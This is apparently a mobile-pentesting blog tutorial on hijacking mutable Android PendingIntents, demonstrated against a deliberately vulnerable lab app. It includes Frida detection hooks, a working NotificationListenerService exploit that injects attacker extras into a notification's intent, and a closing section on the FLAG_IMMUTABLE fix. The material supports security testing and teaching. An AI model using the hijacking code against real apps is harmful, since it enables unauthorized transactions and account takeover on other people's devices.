---
title: Hijacking a Mutable PendingIntent
author: nirajkharel
date: 2026-05-24 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, PendingIntent, Notification]
render_with_liquid: false
---


Android 12 changed the default for `PendingIntent.FLAG_MUTABLE`, apps targeting API 31+ now have to opt in, and Google rolled out a deprecation warning. Despite the warning, mutable PendingIntents are still everywhere, especially in third-party SDKs that have not been updated, push notification handlers, and "share with this widget" surfaces. When the app passes a mutable PendingIntent to another component (notification system, widget host, AlarmManager), the receiving component can modify the intent's extras before firing it. If the original PendingIntent was meant to launch an internal activity, the modifier just got an injection vector into that internal activity.

<aside class="lab">
  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
  <ul>
    <li><code>android/app/src/main/java/com/vulnlab/app/activities/NotificationActivity.java</code> (notification-fired mutable PI)</li>
    <li><code>android/app/src/main/java/com/vulnlab/app/services/AlarmService.java</code> (AlarmManager-fired mutable PI)</li>
  </ul>
</aside>

<br>**The mechanism**

A PendingIntent wraps an Intent and a permission to fire it on the originating app's behalf. When the wrapping app calls `PendingIntent.send()`, the wrapped Intent fires with the wrapping app's UID, same permissions, same internal-activity access. The flags matter. Both VulnLabApp surfaces look like this:

```java
// NotificationActivity — notification with a mutable PI
Intent targetIntent = new Intent(this, FileWriteActivity.class);
targetIntent.putExtra("_original_extra", "safe_value");

int piFlags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE;
PendingIntent pi = PendingIntent.getActivity(this, 1, targetIntent, piFlags);

new NotificationCompat.Builder(this, CHANNEL)
    .setContentTitle("VulnLabApp: Action Required")
    .setContentIntent(pi)
    .build();
```

```java
// AlarmService — scheduled mutable PI
Intent target = new Intent(this, FileWriteActivity.class);
target.putExtra("type", "config");

int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE;
PendingIntent pi = PendingIntent.getActivity(this, 100, target, flags);
am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60_000L, pi);
```

`FLAG_MUTABLE` means whoever holds the PendingIntent can call `fillIn()` to merge their own extras into the wrapped Intent before firing. The wrapped activity then receives a hybrid Intent, the original component target, but with attacker-supplied extras.

The bug is two-step. First, the app constructs a `MUTABLE` PendingIntent. Second, the app hands that PendingIntent to a component that the attacker can interact with, typically:

- A notification posted via `NotificationManager` (the attacker is the user tapping the notification, or another app that can read notifications via the NotificationListenerService)
- An app widget the user adds to their home screen
- A `PendingIntent` set on `AlarmManager` (less attacker-reachable but possible)
- A `PendingIntent` passed in an intent extra to another app

<br>**Spotting it**

Grep the decompile for `PendingIntent.FLAG_MUTABLE` and `PendingIntent.getActivity` / `getBroadcast` / `getService`:

```java
PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_MUTABLE);
```

For each match, walk forward, where does the resulting PendingIntent end up? If it ends up in a `Notification.Builder.setContentIntent()` and the notification action targets an internal activity that reads its extras for sensitive decisions, you have the chain.

Frida confirmation, hook the PendingIntent factory to log the flags and the wrapped intent:

```javascript
Java.perform(function () {
  const PI = Java.use('android.app.PendingIntent');
  PI.getActivity.overload('android.content.Context', 'int', 'android.content.Intent', 'int')
    .implementation = function (ctx, rc, intent, flags) {
      const mutable = (flags & 0x02000000) !== 0;
      const cn = intent.getComponent();
      console.log('[PI.getActivity] mutable=' + mutable + ' target=' + (cn ? cn.flattenToString() : 'implicit'));
      return this.getActivity(ctx, rc, intent, flags);
  };
});
```

Trigger the flow in the app (push notification arrival, widget pin, etc.). The trace shows every PendingIntent the app builds and whether it is mutable.

<br>**The notification path**

Most exploitable path. The app posts a notification with a mutable PendingIntent as the content action. Some other app on the device, yours, registers a `NotificationListenerService` (requires user permission, but the permission is the kind a "smart notification cleaner" app legitimately asks for). The listener service receives the notification, extracts the PendingIntent, calls `fillIn()` with attacker extras, and fires.

```java
public class NotificationHijacker extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!sbn.getPackageName().equals("com.vulnlab.app")) return;
        PendingIntent pi = sbn.getNotification().contentIntent;
        if (pi == null) return;
        try {
            Intent fillIn = new Intent();
            // VulnLabApp wraps FileWriteActivity — overwrite the original extra
            fillIn.putExtra("_original_extra", "attacker_value");
            fillIn.putExtra("filename", "/data/data/com.vulnlab.app/files/owned");
            fillIn.putExtra("content",  "pwned");
            pi.send(this, 0, fillIn);
        } catch (CanceledException ignored) {}
    }
}
```

The PendingIntent fires the target's internal activity (`FileWriteActivity` in VulnLabApp's case) with the attacker's extras merged in. The activity processes the action thinking the notification was tapped by the user.

If the activity reads `user_id` to identify "whose notification was this", that is identity confusion. If it reads `amount` and `authorize` to silently complete a queued transaction, that is unauthorized action. Severity depends on what the activity does.

<br>**The widget path**

App widgets are another mutable-PendingIntent surface. The widget host (the launcher) holds the PendingIntent. An attacker app that can read the widget, or that registers as a custom launcher / widget host, can fire it with mutated extras. Less common but seen in apps with home-screen-pinned banking widgets that expose "transfer to last recipient" actions.

<br>**The cross-app intent-extra path**

Some apps pass PendingIntents in extras to other apps, for example, "if you want me to call back with the result, here is a PendingIntent you can fire". If the receiving app holds the PendingIntent for any time and is itself compromisable, the PendingIntent leaks. If the receiving app is the attacker's own app, the leak is direct:

```java
// The target's "share with my app" feature sends a callback PendingIntent.
Intent share = new Intent("com.attacker.action.SHARE_CALLBACK");
PendingIntent callback = PendingIntent.getActivity(
    this, 0, callbackIntent,
    PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
share.putExtra("callback", callback);
sendBroadcast(share);
```

The attacker's broadcast receiver gets the PendingIntent. The attacker then mutates extras and fires.

<br>**What you actually achieve**

The impact ladder for this primitive:

**Identity injection.** The internal activity reads `user_id` / `account_id` from the PendingIntent's extras. Originally the app put the legitimate user's ID there. Attacker swaps it. The activity now operates on the attacker's chosen identity, usually IDOR on a different user's account.

**Action authorization bypass.** Activities that read "did the user just confirm via notification tap?" from the intent's extras. Attacker forges the confirm extras. The action, usually transactional, completes without the user ever seeing the notification.

**Stale-extra replay.** The PendingIntent's original wrapped intent already has extras (request IDs, nonces). `fillIn()` merges new extras in but does not replace the existing ones. Combine the original nonce with attacker-supplied amount fields to authorize-as-the-real-user but spend-as-the-attacker.

<br>**The mitigation, and what to look for**

The fix is replacing `FLAG_MUTABLE` with `FLAG_IMMUTABLE`. The reason developers do not, third-party SDKs (analytics, push services, ad networks) often demand mutable PendingIntents because they want to inject their own tracking extras at fire time. The fix in the app code does not help if the SDK is what is constructing the PendingIntent.

For analysts: do not stop at the app's own code. Grep the SDK jar / aar files inside the decompile for `PendingIntent.FLAG_MUTABLE`. SDK-side mutable PendingIntents are still the app's bug from a bounty perspective, the app shipped the SDK that posts the notification.

<br>**The Android 14 narrowing**

API 34 added partial mitigations, `fillIn` cannot override certain fields, and the PendingIntent retains some immutability for its component target. The extras path is still mutable. The fields that are now fixed are the action, data URI, and component. The extras are still attacker-injectable, which is what most of these chains exploit.

<br>**Closing**

Mutable PendingIntents are one of those bugs that survived a framework deprecation because the third-party SDK ecosystem did not move with it. The chain, app builds mutable PI, app passes it to a receiver, receiver is reachable by an attacker app, attacker mutates extras, fires every time the conditions line up. The notification-listener path is the most reachable today. Worth checking on every banking or fintech app with rich push notifications.

Happy Hacking !!
